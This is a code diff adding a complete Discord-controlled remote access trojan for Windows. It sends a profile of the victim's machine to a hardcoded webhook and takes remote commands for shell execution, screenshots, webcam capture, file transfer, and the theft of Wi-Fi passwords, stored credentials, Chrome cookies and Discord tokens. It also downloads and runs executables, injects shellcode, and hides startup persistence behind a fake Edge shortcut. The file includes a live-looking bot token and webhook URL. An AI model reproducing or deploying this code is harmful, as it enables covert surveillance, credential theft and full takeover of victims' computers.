@@ -1,0 +1,356 @@
+import os
+import json
+import ctypes
+import platform
+import subprocess
+import requests
+from datetime import datetime
+import discord
+import asyncio
+import pyautogui
+import aiohttp
+import cv2
+from discord.ext import commands
+import base64
+import shutil
+import winreg
+import sys
+
+
+TOKEN = 'MTM2Mzk3NzMyNDI5ODUwNjMzMA.GFzMBJ.5RCoY7rRJnk46hDTvEuQ1Sho5JENIqFG2nMcqg'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1366866328186519725/RbcFre6X_qohyZpUbeQjr-S2Rbsrh3iIWzfhJ9cwmi-bB0-ryxh8oetLEf394w5GS4Km'
+ALLOWED_USER_ID = '1114278079959945226'
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+def send_webhook_embed(embed: discord.Embed):
+    data = {
+        "embeds": [embed.to_dict()]
+    }
+    requests.post(WEBHOOK_URL, json=data)
+
+async def send_webhook(message: str):
+    async with aiohttp.ClientSession() as session:
+        await session.post(WEBHOOK_URL, json={"content": message})
+
+@bot.event
+async def on_ready():
+    print(f"✅ Logged in as {bot.user} - Starting initial system scan...")
+
+    ps_script = '''
+    $admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    $vm_models = "VirtualBox","VMware","Virtual","KVM","Hyper-V","Xen"
+    $model = (Get-CimInstance Win32_ComputerSystem).Model
+    $vm = ($vm_models | Where-Object { $model -like "*$_*" }) -ne $null
+    $os = Get-CimInstance Win32_OperatingSystem
+    $ip = (Get-NetIPAddress | Where-Object {
+        $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notmatch "^169\.254\."
+    }).IPAddress | Select-Object -First 1
+
+    [PSCustomObject]@{
+        User = "$env:USERNAME@$env:COMPUTERNAME"
+        OS = "$($os.Caption) | Build: $($os.BuildNumber)"
+        IP = $ip
+        Admin = $admin
+        VM = $vm
+    } | ConvertTo-Json -Compress
+    '''
+
+    try:
+        output = subprocess.check_output(
+            ['powershell', '-NoProfile', '-Command', ps_script],
+            stderr=subprocess.STDOUT,
+            timeout=10,
+            shell=False
+        )
+        sys_info = json.loads(output.decode('utf-8'))
+    except Exception as e:
+        sys_info = {
+            'User': f"{os.getenv('USERNAME', 'Unknown')}@{os.getenv('COMPUTERNAME', 'Unknown')}",
+            'OS': f"{platform.system()} {platform.version()}",
+            'IP': 'N/A',
+            'Admin': ctypes.windll.shell32.IsUserAnAdmin() != 0,
+            'VM': False
+        }
+
+    embed = discord.Embed(title="🖥️ System Snapshot", color=0x00ff00)
+    embed.add_field(name="👤 User", value=f"```{sys_info.get('User', 'N/A')}```", inline=False)
+    embed.add_field(name="🌐 IP Address", value=f"```{sys_info.get('IP', 'N/A')}```", inline=True)
+    embed.add_field(name="🛡️ Admin", value=f"```{sys_info.get('Admin', False)}```", inline=True)
+    embed.add_field(name="💻 OS Version", value=f"```{sys_info.get('OS', 'N/A')}```", inline=False)
+    embed.add_field(name="☁️ Virtual Machine", value=f"```{sys_info.get('VM', False)}```", inline=True)
+    embed.set_footer(text=f"Scan ID: {os.urandom(4).hex()} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+
+    send_webhook_embed(embed)
+
+@bot.command()
+async def powershell(ctx, *, script):
+    if str(ctx.author.id) != str(ALLOWED_USER_ID):
+        return
+
+    try:
+        sanitized = ''.join(c for c in script if c.isprintable())
+        result = subprocess.run(
+            ["powershell", "-Command", sanitized],
+            capture_output=True, text=True, timeout=10
+        )
+        output = result.stdout or result.stderr
+        formatted = f"✅ **PowerShell Executed**\n```{sanitized}```\n📝 **Output**\n```{output[:1900]}```"
+        await send_webhook(formatted)
+    except Exception as e:
+        await send_webhook(f"❌ PowerShell Error: `{e}`")
+
+@bot.command()
+async def screenshot(ctx):
+    if str(ctx.author.id) != str(ALLOWED_USER_ID):
+        return
+
+    try:
+        image = pyautogui.screenshot()
+        path = "screenshot.png"
+        image.save(path)
+
+        with open(path, "rb") as f:
+            file = discord.File(f, filename=path)
+            await ctx.send("📸 **Screenshot taken:**", file=file)
+        os.remove(path)
+    except Exception as e:
+        await send_webhook(f"❌ Screenshot Error: `{e}`")
+
+@bot.command()
+async def webcam(ctx):
+    if str(ctx.author.id) != str(ALLOWED_USER_ID):
+        return
+
+    try:
+        cam = cv2.VideoCapture(0)
+        await asyncio.sleep(1)
+        ret, frame = cam.read()
+        cam.release()
+
+        if ret:
+            path = "webcam.png"
+            cv2.imwrite(path, frame)
+
+            with open(path, "rb") as f:
+                file = discord.File(f, filename=path)
+                await ctx.send("📷 **Webcam snapshot taken:**", file=file)
+            os.remove(path)
+        else:
+            await send_webhook("❌ Failed to access webcam (no frame captured).")
+    except Exception as e:
+        await send_webhook(f"❌ Webcam Error: `{e}`")
+
+@bot.command()
+async def upload(ctx):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+    if not ctx.message.attachments:
+        await ctx.send("⚠️ No file attached.")
+        return
+
+    attachment = ctx.message.attachments[0]
+    await attachment.save(attachment.filename)
+    await ctx.send(f"✅ Saved `{attachment.filename}` on victim machine.")
+    
+@bot.command()
+async def download(ctx, *, file: str):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+    try:
+        with open(file, 'rb') as f:
+            await ctx.send(file=discord.File(f))
+    except Exception as e:
+        await ctx.send(f"❌ File not found or error: `{e}`")
+
+@bot.command()
+async def cmd(ctx, *, command):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+    output = subprocess.getoutput(command)
+    await ctx.send(f'📟 Output:\n```{output[:1900]}```')
+
+@bot.group()
+async def theft(ctx):
+    if ctx.invoked_subcommand is None:
+        await ctx.send("Use a valid subcommand: `wifi_passwords`, `win_passwords`, `browser_cookies`")
+
+@theft.command()
+async def wifi_passwords(ctx):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+
+    result = subprocess.getoutput('netsh wlan show profiles')
+    profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]
+
+    output = ""
+    for profile in profiles:
+        cmd = f'netsh wlan show profile name="{profile}" key=clear'
+        profile_data = subprocess.getoutput(cmd)
+        for line in profile_data.splitlines():
+            if "Key Content" in line:
+                password = line.split(":")[1].strip()
+                output += f"📡 {profile}: `{password}`\n"
+                break
+        else:
+            output += f"📡 {profile}: ❌ No password found\n"
+
+    await ctx.send(output or "No Wi-Fi profiles found.")
+
+async def win_passwords(ctx):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+
+    # WARNING: This uses Windows Credentials Locker — can be customized for real Chrome db parsing
+    try:
+        output = subprocess.check_output('cmdkey /list', shell=True)
+        await ctx.send(f"🛡️ Saved Credentials:\n```{output.decode()[:1900]}```")
+    except Exception as e:
+        await ctx.send(f"❌ Failed to dump browser passwords: {e}")
+
+# Cookies Dump (simulate with browser paths)
+@theft.command()
+async def browser_cookies(ctx):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+
+    try:
+        path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Default\Cookies')
+        if os.path.exists(path):
+            await ctx.send(file=discord.File(path))
+        else:
+            await ctx.send("❌ Chrome cookies not found.")
+    except Exception as e:
+        await ctx.send(f"❌ Failed to dump cookies: {e}")
+
+@bot.command()
+async def wallpaper_change(ctx, url: str):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+    
+    try:
+        ps_script = f"""
+        $wallpaperPath = "$env:TEMP\\wallpaper_{os.urandom(4).hex()}.jpg"
+        try {{
+            (New-Object Net.WebClient).DownloadFile('{url}', $wallpaperPath)
+            Add-Type @'
+            using System;
+            using System.Runtime.InteropServices;
+            public class Wallpaper {{
+                [DllImport("user32.dll", CharSet=CharSet.Auto)]
+                public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+            }}
+'@
+            [Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)
+            Remove-Item $wallpaperPath -Force -ErrorAction SilentlyContinue
+            "Wallpaper changed successfully"
+        }} catch {{
+            "Error: $_"
+        }}
+        """
+        
+        output = execute_powershell(ps_script)
+        await ctx.send(f"🎨 {output}")
+    except Exception as e:
+        await ctx.send(f"❌ Wallpaper change failed: {str(e)}")
+
+@bot.command()
+async def steal_discord(ctx):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+    
+    tokens = []
+    # Discord token paths for all supported versions
+    paths = [
+        os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'),
+        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
+    ]
+    
+    for path in paths:
+        if os.path.exists(path):
+            for file in os.listdir(path):
+                if file.endswith('.ldb') or file.endswith('.log'):
+                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
+                        content = f.read()
+                        tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content))
+    
+    await ctx.send(f"🔑 Found {len(tokens)} tokens:\n```{', '.join(tokens[:5])}```")
+
+@bot.command()
+async def runexe(ctx, url: str):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+    
+    exe_path = os.path.join(os.getenv('TEMP'), 'update.exe')
+    try:
+        # Download and execute
+        subprocess.run(
+            f'bitsadmin /transfer job /download /priority high "{url}" "{exe_path}" && start "" "{exe_path}"',
+            shell=True,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        await ctx.send("✅ Executable downloaded and running")
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command()
+async def inject(ctx, pid: int, shellcode: str):
+    if str(ctx.author.id) != ALLOWED_USER_ID: return
+    
+    try:
+        # Base64 decode shellcode
+        decoded_sc = base64.b64decode(shellcode)
+        
+        # Convert to hexadecimal
+        hex_sc = ''.join(f'\\x{byte:02x}' for byte in decoded_sc)
+        
+        # PowerShell injection
+        ps_script = f"""
+        $sc = [System.Convert]::FromBase64String('{shellcode}')
+        $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
+        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
+        $thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+            $mem,
+            [type]{{public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);}}
+        )
+        $thread.Invoke([IntPtr]::Zero, [UIntPtr]::Zero, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        """
+        
+        output = execute_powershell(ps_script)
+        await ctx.send(f"✅ Shellcode injected to PID {pid} | {output[:100]}...")
+    except Exception as e:
+        await ctx.send(f"❌ Injection failed: {str(e)}")
+
+@bot.command()
+async def startup(ctx):
+    """Creates Microsoft Edge Browser startup persistence"""
+    if str(ctx.author.id) != ALLOWED_USER_ID: 
+        return await ctx.send("❌ Unauthorized")
+
+    try:
+        # Get bot's current executable path
+        bot_path = sys.executable
+        
+        # Startup folder path
+        startup_folder = os.path.join(
+            os.getenv('APPDATA'),
+            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+        )
+        
+        # Create shortcut
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortCut(
+            os.path.join(startup_folder, "Microsoft Edged Browser.lnk")
+        )
+        
+        # Configure shortcut properties
+        shortcut.TargetPath = "cmd.exe"
+        shortcut.Arguments = f'/c start /min "" "{bot_path}" --hidden'
+        shortcut.WorkingDirectory = os.path.dirname(bot_path)
+        shortcut.WindowStyle = 7  # Minimized window
+        shortcut.IconLocation = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe, 0"
+        shortcut.save()
+
+        await ctx.send("✅ **Stealth Startup Created**\n"
+                      "```diff\n"
+                      "+ Name: Microsoft Edged Browser.lnk\n"
+                      "+ Location: Startup folder\n"
+                      "+ Runs: On user login (hidden)\n"
+                      "```")
+    except Exception as e:
+        await ctx.send(f"❌ Error creating persistence: {str(e)}")
+        
+bot.run(TOKEN)
